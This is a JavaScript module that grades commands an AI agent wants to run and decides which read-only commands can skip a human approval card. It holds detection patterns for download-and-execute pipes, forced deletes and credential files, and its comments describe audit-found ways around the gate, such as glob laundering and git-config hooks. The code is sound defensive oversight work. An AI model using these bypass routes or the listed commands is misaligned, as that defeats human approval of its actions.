// Static risk grading for exec approval cards (feedback item 22).
//
// The approval card used to treat every run_shell / run_python call
// alike: `ls` and `curl evil.sh | bash` rendered identically, so the
// human's eye had nothing to catch on. This module grades the command
// TEXT (never executed here) into three stable bands the client
// renders differently:
//
//   'high'   — known-dangerous shapes: download-and-execute pipes,
//              package installs, privilege / filesystem destruction,
//              writes into system locations.
//   'low'    — a single simple read-only command from a small
//              allowlist, with no shell metacharacters at all.
//   'normal' — everything else (the default; most real commands).
//
// Grading is advisory display only: it never permits or denies by
// itself, and the approval gate is unchanged. A miss toward 'normal'
// is acceptable; a miss that calls a destructive command 'low' is
// not — so 'low' requires the WHOLE input to be one plain command.
//
// v0.15 (sweep P0-1): grading and the read-only gate also carry a
// PATH dimension. The verb-only era let `cat ~/.starts-agents/
// vault.key` sail through as a quiet read-only command — the verb
// was innocent, the target was the vault master key. Now any path
// token is classified: 'sensitive' (vault key, app database, the
// ~/.starts-agents dir, env/key files) grades 'high' outright and
// never auto-passes; 'outside' (resolves beyond the bot workspace)
// never grades 'low' and never auto-passes; only paths provably
// inside the workspace keep the old verb-only treatment.
import path from 'node:path';
import os from 'node:os';

const HIGH_SHELL = [
  // download piped straight into a shell / interpreter
  /\b(?:curl|wget)\b[^|;&\n]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b/,
  /\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b[^|;&\n]*(?:<\s*\(|https?:)/,
  // package installation (runs arbitrary install scripts)
  /\b(?:pip3?|npm|yarn|pnpm|gem|brew|apt(?:-get)?|dnf|yum|apk)\s+(?:install|i|add|upgrade|update)\b/,
  /\bgit\s+clone\b/,
  // recursive forced delete, anywhere
  /\brm\s+(?:[^|;&\n]*\s)?-[a-zA-Z]*r[a-zA-Z]*f|\brm\s+(?:[^|;&\n]*\s)?-[a-zA-Z]*f[a-zA-Z]*r/,
  /\bsudo\b/,
  /\b(?:chmod|chown)\b/,
  /\bdd\b[^|;&\n]*\bof\s*=/,
  /\bmkfs(?:\.[a-z0-9]+)?\b/,
  /\b(?:shutdown|reboot|poweroff|halt|init\s+0)\b/,
  // writing into system locations
  /(?:^|[|;&\n])\s*(?:cp|mv|install|tee)\b[^|;&\n]*\s\/(?:etc|usr|bin|sbin|boot|var\/|lib)\b/,
  />\s*\/(?:etc|usr|bin|sbin|boot)\//,
  /\bcrontab\b/,
  /\buser(?:add|mod|del)\b|\bpasswd\b/,
  /\bkill\s+-9\s+1\b/,
];

const HIGH_PYTHON = [
  /\bos\.system\s*\(/,
  /\bsubprocess\./,
  /\bshutil\.rmtree\s*\(/,
  /\bos\.(?:remove|unlink|rmdir|removedirs)\s*\(/,
  /\b(?:eval|exec|__import__)\s*\(/,
  /\burllib\.request\.urlopen\s*\(/,
  /\bopen\s*\([^)]*['"]\s*\/etc\//,
];

const LOW_HEADS = [
  /^(?:ls|ll|dir)\b/,
  /^(?:cat|head|tail|less|more)\b/,
  /^pwd\b/,
  /^echo\b/,
  /^(?:wc|stat|file|du|df|free|uname|date|whoami|hostname|which|type|env|printenv|id)\b/,
  /^(?:grep|rg|ag|find|tree|sort|uniq|cut|awk|sed\s+-n)\b/,
  /^git\s+(?:status|log|diff|branch|show|remote|rev-parse|describe)\b/,
  /^node\s+(?:--version|-v)\b/,
  /^(?:npm|pnpm|yarn)\s+(?:ls|list|view|outdated)\b/,
  /^python3?\s+--version\b/,
];

// Shell metacharacters disqualify 'low' outright: a "read-only head"
// with a redirect or substitution is not read-only.
const LOW_FORBIDDEN = /[|&;<>`$(){}\n\\]/;

function segments(text) {
  return String(text || '').split(/[|;&\n]+/).map((s) => s.trim()).filter(Boolean);
}

/* ------------------------- path dimension -------------------------
 * Needles are matched against the RAW text first (catches paths
 * embedded in quotes or code strings: open('…/vault.key')), then
 * each whitespace token is resolved properly for the inside /
 * outside call. The sensitive set mirrors the file tools' list in
 * tools.js (isSensitiveFile) plus the app's own state locations —
 * deliberately duplicated here so this module stays dependency-free. */
const SENSITIVE_NEEDLES = ['vault.key', '.vault-key', 'app.db', 'share-secret', '.starts-agents'];
const SENSITIVE_BASE = /(?:^|[/\\])\.env(?:\.|$)|(?:^|[/\\])\.envrc$|\.(?:pem|key|p12|pfx|keystore|p8)$|(?:^|[/\\])id_(?:rsa|dsa|ecdsa|ed25519)$|(?:^|[/\\])secrets?\.json$|(?:^|[/\\])token\.json$/i;

function tokenSensitive(tok) {
  const low = tok.toLowerCase();
  return SENSITIVE_NEEDLES.some((n) => low.includes(n)) || SENSITIVE_BASE.test(tok);
}

/* Resolve one token to an absolute path, or null when it is not
 * path-shaped. Glob suffixes are cut at the first wildcard so
 * `/etc/*.conf` judges as `/etc`. */
/* Glob-shaped sensitive hits (v0.15.2, audit B-P1-3): a wildcard
 * in a path segment used to launder the literal needles — a cat
 * of the home glob for the starts-agents dir plus a vault glob
 * matched nothing while naming exactly the vault key. Each glob
 * segment is compiled to a regex and tested against the
 * sensitive segment names; an extension-wide pattern (star dot
 * db, star dot pem…) names a class that includes them. */
const SENSITIVE_SEGMENTS = ['.starts-agents', 'vault.key', '.vault-key', 'app.db', 'share-secret', '.env', 'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'secrets.json', 'token.json'];
function globSegmentHit(tok) {
  for (const seg of String(tok).split(/[/\\]/)) {
    if (!/[*?]/.test(seg)) continue;
    if (/^\*\.(db|pem|key|p12|pfx|keystore|p8)$/i.test(seg)) return true;
    const esc = seg.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const re = new RegExp('^' + esc.replace(/\\\*/g, '.*').replace(/\\\?/g, '.') + '$', 'i');
    if (SENSITIVE_SEGMENTS.some((s) => re.test(s))) return true;
  }
  return false;
}

function resolveTokenPath(tok, workspace) {
  let t = tok;
  // Long-option values (--file=/path, --out=/path) carry the path
  // after the '='; without this strip the whole '--file=/…' token
  // was resolved as a workspace-RELATIVE path and judged 'inside'
  // (v0.15.2, audit B-P1-3 — the grep --file= auto-pass bypass).
  if (t.startsWith('--')) {
    const eq = t.indexOf('=');
    if (eq > 2) t = t.slice(eq + 1);
  }
  t = t.replace(/^[A-Za-z_][A-Za-z0-9_]*=/, ''); // VAR=/path
  t = t.replace(/['"`]/g, '');
  if (!t) return null;
  const globAt = t.search(/[*?]/);
  if (globAt === 0) return null;
  if (globAt > 0) t = t.slice(0, globAt).replace(/[/\\][^/\\]*$/, '') || '/';
  if (t === '~' || t.startsWith('~/')) return path.join(os.homedir(), t.slice(2));
  if (t === '$HOME' || t.startsWith('$HOME/')) return path.join(os.homedir(), t.slice(6));
  if (t.startsWith('/')) return path.normalize(t);
  if (t.includes('/') || t === '.' || t === '..') {
    return workspace ? path.resolve(workspace, t) : (t === '..' || t.startsWith('../') ? '\0outside' : '\0inside');
  }
  return null;
}

/* 'inside' — no path token, or every path provably within the
 * workspace; 'outside' — some path escapes it; 'sensitive' — the
 * text names a sensitive target anywhere (checked on the raw text,
 * so quoting cannot launder it). */
export function classifyShellPaths(text, opts = {}) {
  const raw = String(text || '');
  const low = raw.toLowerCase();
  if (SENSITIVE_NEEDLES.some((n) => low.includes(n))) return 'sensitive';
  const ws = opts.workspace ? path.resolve(opts.workspace) : null;
  let worst = 'inside';
  for (const tok of raw.split(/\s+/)) {
    if (!tok || tok.startsWith('-')) {
      // A flag can still hide a path after '=' (--out=/etc/x).
      if (!tok.includes('=')) continue;
    }
    if (tokenSensitive(tok)) return 'sensitive';
    if (globSegmentHit(tok)) return 'sensitive';
    const resolved = resolveTokenPath(tok, ws);
    if (resolved === null) continue;
    if (resolved === '\0outside') { worst = 'outside'; continue; }
    if (resolved === '\0inside') continue;
    if (ws) {
      if (!(resolved === ws || resolved.startsWith(ws + path.sep))) worst = 'outside';
    } else if (tok.startsWith('/') || tok.startsWith('~') || tok.startsWith('$HOME')) {
      worst = 'outside'; // no workspace context: absolute targets are unprovable
    }
  }
  return worst;
}

export function gradeShellText(text, opts = {}) {
  const raw = String(text || '');
  if (!raw.trim()) return 'normal';
  for (const re of HIGH_SHELL) if (re.test(raw)) return 'high';
  const cls = classifyShellPaths(raw, opts);
  if (cls === 'sensitive') return 'high';
  const segs = segments(raw);
  if (segs.length === 1 && !LOW_FORBIDDEN.test(raw.trim())) {
    const cmd = segs[0].replace(/^(?:command\s+|env\s+\S+\s+)/, '');
    if (cls === 'inside' && LOW_HEADS.some((re) => re.test(cmd))) return 'low';
  }
  return 'normal';
}

export function gradePythonText(text, opts = {}) {
  const raw = String(text || '');
  if (!raw.trim()) return 'normal';
  for (const re of HIGH_PYTHON) if (re.test(raw)) return 'high';
  // Shell-shaped dangers smuggled through a Python string still count.
  for (const re of HIGH_SHELL) if (re.test(raw)) return 'high';
  // A snippet naming a sensitive target grades like the shell
  // equivalent (v0.15 path dimension): open('…/vault.key') is not
  // a 'normal' read just because it is spelled in Python.
  if (classifyShellPaths(raw, opts) === 'sensitive') return 'high';
  return 'normal';
}

/* -------- exec-config paths (v0.15.7, item 118-1) --------
 * Some workspace paths are not data, they are INSTRUCTIONS to the
 * tools that run later: a git config (core.fsmonitor, core.pager,
 * diff/merge drivers, include.path…), git hooks, .gitmodules. A
 * write landing there converts the next innocent-looking command
 * (`git status`, auto-passed as read-only) into code execution —
 * the audit's reproduced chain was exactly this: an uncarded
 * write_file into .git/config, then an auto-passed git status ran
 * the planted script, no card anywhere. Writes to these paths
 * therefore NEVER skip the card — not via the owner auto-pass,
 * not via a grant. The git side of the chain is closed separately:
 * isReadOnlyShell refuses git heads when the repo config carries
 * exec-capable keys (see gitRisky below). */
export function isExecConfigPath(rel) {
  const parts = String(rel || '').replace(/\\/g, '/').split('/').filter((s) => s && s !== '.');
  if (!parts.length) return false;
  if (parts.includes('.git')) return true; // .git dir at any depth, or the gitdir pointer file
  return parts[parts.length - 1] === '.gitmodules';
}

/* The one entry point the approval broker uses: grade by tool.
 * run_shell grades args.command; run_python grades args.code (a
 * file-only call has no text to grade and stays 'normal'). Anything
 * else is not an exec tool and gets null — the client renders no
 * risk line for it. */
export function commandRisk(tool, args, opts = {}) {
  const a = args || {};
  if (tool === 'run_shell') return gradeShellText(a.command, opts);
  if (tool === 'run_python') return a.code ? gradePythonText(a.code, opts) : 'normal';
  return null;
}

/* -------- provably-read-only auto-pass (v0.14.2, item 51) --------
 * STRICTER than the 'low' display grade above: this predicate
 * decides whether a run_shell call may skip its approval card, so
 * a false "read-only" verdict would be a security hole, not a
 * display wart. It is self-contained (the display allowlist does
 * not even know unzip/tar): not 'high', no shell metacharacters
 * anywhere in the raw text (no pipe, no redirect, no ;/&&
 * chaining, no substitution), exactly one segment — and on top of
 * that, a strict head allowlist plus per-head rules close the
 * holes a plain allowlist would tolerate:
 *   find     — no -exec/-delete/-ok/-fprintf family tokens
 *   git      — read verbs only; `git branch` only bare or with
 *              listing flags (a positional arg CREATES a branch)
 *   unzip    — listing/test mode only (-l… or -t), never extract
 *   tar      — list mode (-t…) only
 *   sort/awk/sed/rg — never (sort -o writes, awk/sed can write,
 *              rg --pre executes); tree -o is caught by the -o ban
 *   date     — no -s/--set, no bare digit string (that SETS time)
 *   hostname — no positional arg (that SETS the name)
 *   env      — VAR=value prefixes are stripped and the remainder
 *              must itself pass as the head command
 * Anything not provably read-only returns false and the card
 * stays. run_python never auto-passes: a snippet's effects cannot
 * be proven from its text. */
const GATE_WRITE_TOKENS = new Set(['-o', '--output', '--out', '-exec', '-execdir', '-ok', '-okdir', '-delete', '-fls', '-fprint', '-fprintf']);
const GATE_HEADS = [
  /^(?:ls|ll|dir)\b/, /^cat\b/, /^(?:head|tail)\b/, /^pwd\b/, /^echo\b/,
  /^(?:wc|stat|file|du|df|free|uname|which|type|id|tree|uniq|cut|whoami)\b/,
  /^grep\b/, /^find\b/, /^zipinfo\b/, /^unzip\b/, /^tar\b/,
  /^git\s+(?:status|log|diff|show|rev-parse|describe)\b/, /^git\s+branch\b/,
  /^date\b/, /^hostname\b/, /^env\b/, /^printenv\b/,
  /^node\s+(?:--version|-v)\s*$/, /^(?:npm|pnpm|yarn)\s+(?:ls|list|view|outdated)\b/, /^python3?\s+--version\s*$/,
];
export function isReadOnlyShell(text, opts = {}) {
  const raw = String(text || '').trim();
  if (!raw) return false;
  if (gradeShellText(raw, opts) === 'high') return false;
  if (LOW_FORBIDDEN.test(raw)) return false;
  if (segments(raw).length !== 1) return false;
  const head = gateHead(raw);
  if (!head) return false;
  // Config-triggered execution (v0.15.7, item 118-1): a git verb
  // is only as read-only as the repo config it obeys — fsmonitor,
  // pager, diff/textconv drivers and include chains all turn
  // status/diff/log into program execution. When the caller
  // reports the workspace repo's config carries such keys
  // (tools.js gitConfigExecRisk), git never auto-passes.
  if (head === 'git' && opts.gitRisky) return false;
  // Path dimension (v0.15, sweep P0-1): the verb gate alone used to
  // wave `cat ~/.starts-agents/vault.key` through without a card.
  // An auto-pass now additionally requires every path in the
  // command to be provably inside the bot's own workspace (or no
  // path at all — bare `ls`, `git status` run in the workspace by
  // construction of the shell's cwd).
  return classifyShellPaths(raw, opts) === 'inside';
}
/* Environment assignments riding a command are an execution
 * channel of their own (v0.15.7, item 118-1): TAR_OPTIONS hands
 * tar a checkpoint ACTION, GIT_* re-points git, GREP_OPTIONS /
 * LESSOPEN / ZIPOPT do the same for their tools — none of that is
 * visible in the judged command text. Only display/locale
 * variables with no consumer-side semantics may prefix an
 * auto-passed command; any other assignment sends the call to a
 * card, whether it rides bare or through `env`. */
const GATE_BENIGN_ENV = new Set(['LC_ALL', 'LANG', 'LANGUAGE', 'TZ', 'TERM']);
function assignmentsBenign(tokens) {
  return tokens.every((tk) => GATE_BENIGN_ENV.has(tk.slice(0, tk.indexOf('='))));
}
/* Returns the judged head command, or null when the text is not a
 * provably read-only single command. (Was gateCheck's boolean;
 * the head rides back so callers can apply per-head policy.) */
function gateHead(raw) {
  let tokens = raw.split(/\s+/).filter(Boolean);
  if (tokens[0] === 'command') tokens = tokens.slice(1);
  // `env` is a launcher, not a reader: strip it plus its VAR=value
  // assignments and judge the command that remains. Bare env (or
  // env with only assignments) just prints the environment.
  if (tokens[0] === 'env') {
    tokens = tokens.slice(1);
    let j = 0;
    while (j < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[j])) j++;
    if (!assignmentsBenign(tokens.slice(0, j))) return null;
    if (j === tokens.length) return 'env';
    return gateHead(tokens.slice(j).join(' '));
  }
  let i = 0;
  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
  if (i > 0) {
    if (!assignmentsBenign(tokens.slice(0, i))) return null;
    return gateHead(tokens.slice(i).join(' '));
  }
  if (!tokens.length) return null;
  const cmd = tokens.join(' ');
  if (!GATE_HEADS.some((re) => re.test(cmd))) return null;
  // Write/exec-shaped options: the exact-token set plus the
  // `--output=` glued form and the git switches that invoke
  // configured external programs (diff driver, textconv, gpg).
  if (tokens.some((tk) => GATE_WRITE_TOKENS.has(tk) || tk.startsWith('--output=')
    || tk === '--ext-diff' || tk === '--textconv' || tk === '--show-signature')) return null;
  const head = tokens[0];
  const rest = tokens.slice(1);
  if (head === 'find') return head; // write tokens already banned above
  if (head === 'git' && tokens[1] === 'branch') {
    return rest.slice(1).every((tk) => ['-a', '-r', '-l', '--list', '--all', '--remotes', '-v', '-vv'].includes(tk)) ? head : null;
  }
  if (head === 'unzip') {
    if (rest.some((tk) => tk === '-d' || tk === '-o' || tk === '-n')) return null;
    return rest.some((tk) => /^-[a-z]*l[a-z]*$/.test(tk) || tk === '-t' || tk === '--test') ? head : null;
  }
  if (head === 'tar') {
    // tar's own exec surfaces (v0.15.7): a checkpoint ACTION runs a
    // command mid-listing, -I/-F name programs to run, the rsh
    // command serves remote archives. None may ride a listing.
    if (rest.some((tk) => tk === '-I' || tk === '-F'
      || tk.startsWith('--checkpoint') || tk.startsWith('--use-compress-program')
      || tk.startsWith('--info-script') || tk.startsWith('--to-command') || tk.startsWith('--rsh-command')
      || /^-[a-zA-Z]*[FI][a-zA-Z]*$/.test(tk))) return null;
    return rest.some((tk) => /^-[a-z]*t[a-z]*$/.test(tk)) && !rest.some((tk) => /^-[a-z]*[xc][a-z]*$/.test(tk)) ? head : null;
  }
  if (head === 'date') {
    return rest.every((tk) => tk.startsWith('+') || ['-u', '--utc', '--universal', '-I', '--iso-8601'].includes(tk) || /^--iso-8601=/.test(tk)) ? head : null;
  }
  if (head === 'hostname') {
    return rest.every((tk) => tk.startsWith('-')) ? head : null;
  }
  if (head === 'uniq') {
    // uniq's SECOND positional is an output file — a write wearing
    // a reader's clothes. One positional (the input) or none.
    let positionals = 0;
    for (let k = 0; k < rest.length; k++) {
      const tk = rest[k];
      if (tk === '-f' || tk === '-s' || tk === '-w') { k++; continue; }
      if (tk.startsWith('-')) continue;
      positionals++;
    }
    return positionals <= 1 ? head : null;
  }
  return head;
}
